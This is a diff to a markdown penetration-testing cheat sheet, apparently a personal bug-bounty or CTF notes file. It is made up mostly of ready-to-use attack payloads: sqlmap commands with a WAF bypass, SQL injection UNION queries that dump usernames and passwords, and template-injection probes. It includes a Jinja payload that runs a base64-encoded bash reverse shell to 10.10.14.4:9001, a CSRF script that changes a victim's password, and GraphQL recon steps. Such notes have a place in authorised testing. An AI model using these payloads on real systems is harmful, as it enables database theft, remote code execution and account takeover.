@@ -74,8 +74,6 @@ sqlmap -r req.txt-p  -D <database_name> --dump-all
 
 --tamper=space2comment #bypass waf
 ```
-
-## syntaxis
 ## mysql
 ```sql
 .tables 										#to see all tables
@@ -99,15 +97,20 @@ search[$ne]=string #mongodb
 ```
 ## payloads
 ```sql
-username=gfd'+union+select+'password'+--+-&password=password
+username=gfd'+union+select+'password'+--+-&password=password      '
 
 ?id=2 and 'foo' 'bar' = 'foobar'     # mysql
 ?id=2 and 'foo'+'bar'='foobar'       # mssql
 ?id=2 and substring('foo',1,1) = 'f' # postgresql
 ?id=2 and lengthb('foo') = 3         # oracle
 not previous                         # sqlite
+
+
+' '  => mysql
+'+'  => mssql
+'||' => postgres, sqlite, oracle
 ```
-# mysqli
+## mysqli
 get version
 ```sql
 UNION SELECT 1,VERSION(),3,4 -- -
@@ -122,7 +125,7 @@ UNION SELECT 1,group_concat(table_schema,':',table_name),3,4 FROM information_sc
 ```
 get columns:
 ```sql
-UNION SELECT 1,group_concat(table_schema,':',column_name),3,4 FROM information_schema.columns WHERE table_schema IN ('website','second_project','dev_site')-- -
+UNION SELECT 1,group_concat(table_schema,':',table_name,':',column_name),3,4 FROM information_schema.columns WHERE table_schema IN ('website','second_project','dev_site')-- -
 ```
 get users and passwords:
 ```sql
@@ -142,6 +145,15 @@ UNION SELECT 1,group_concat(username,':',password),3,4 FROM website.users -- -
 {{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
 
 {% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} {{a}} {% endwith %}
+
+
+${{<%[%'"}}%\.
+
+{{7*7}}
+${7*7}
+<%= 7*7%>
+${{7*7}}
+#{7*7}
 ```
 # steal cookie
 ```
@@ -397,6 +409,40 @@ fragment TypeRef on __Type {
 		}
 	}
 }
+```
+## bb tips
+1. Identifying GraphQL Targets: Start by identifying GraphQL targets using the powerful Nuclei Scanning: nuclei -u target.com -t graphql-detect.yaml (https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/9b8da6f22de63f2a146aa3e425bb40abd33f5e32/http/technologies/graphql-detect.yaml)
+2. Retrieve the GraphQL Schema for hidden Query/Mutations: If Introspection is enabled, you can obtain the GraphQL Schema, revealing hidden GraphQL Operations and Mutations using the following GraphQL Query:
+```
+{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
+```
+
+3. Visualize with GraphQL Voyager: To visualize the GraphQL Schema effectively and craft your attack vector, use GraphQL Voyager - a powerful tool to help you navigate the schema: graphql-voyager (https://graphql-kit.com/graphql-voyager/)
+4. Retrieve Hidden Queries and Mutations: Retrieve GraphQL Queries and Mutations from JavaScript files when Introspection is disabled. These files may list hidden methods not accessible via the app's regular functionality. Try making direct requests to these.
+5. Craft Your Attack: Craft your attack using the identified GraphQL Queries and Mutations (https://www.youtube.com/watch?v=KOCBeJmTs78) with Inql scanner. (https://github.com/doyensec/inql) These methods are often vulnerable to various bug classes, including IDOR, RBAC, Race Condition, SQL, and more (https://habr.com/ru/companies/tomhunter/articles/676478/).
+If you can't find more GraphQL Queries and Mutations, don't worry! Stay tuned for upcoming insights on how to brute force and discover hidden ones.
+Takeaways: Don't hit a dead end with GraphQL apps. Dive deeper, find those concealed GraphQL Queries and Mutations, and unlock unimaginable functionalities that can lead to significant bounties!
+# Crawling parameters with Katana for quick XSS/SQLI
+```sh
+katana -u http://domain.com -silent -d 15 -rl 500 -jc -c 20 -kf all -ct 2m -sf qurl -o urls.txt
+urless -i urls.txt -o output.txt
+nuclei -l output.txt -t fuzzing-templates/ -silent
+```
+# csrf json
+Во время проекта наткнулся на функциональность изменения профиля. Ну и, понятное дело, не проверить CSRF было бы грехом. Однако, общение с бэкендом происходит через Rest с использованием `Content-type: application/json`. Вместо `application/json` ставим `application/x-www-form-urlencoded`, а тело запроса оставляем прежним :).  
+Сразу хочется отметить, что burp не сгенерирует полезную нагрузку, поэтому вот сниппет, которым можно воспользоваться:
+
+```js
+<script>
+let req = new XMLHttpRequest();
+req.open("POST", "https://vulnerable.host/api/profile/update", false);
+req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+req.withCredentials = true;
+
+var params = '{"first_name":"riven","last_name":"riven","birthday":"01/01/1337", "password":"pwned"}';
+console.log(params);
+req.send(params);
+</script>
 ```
 # links
 - [steal admin cookie/sqli](./src/marketplace.md) (tryhackme:marketplace)
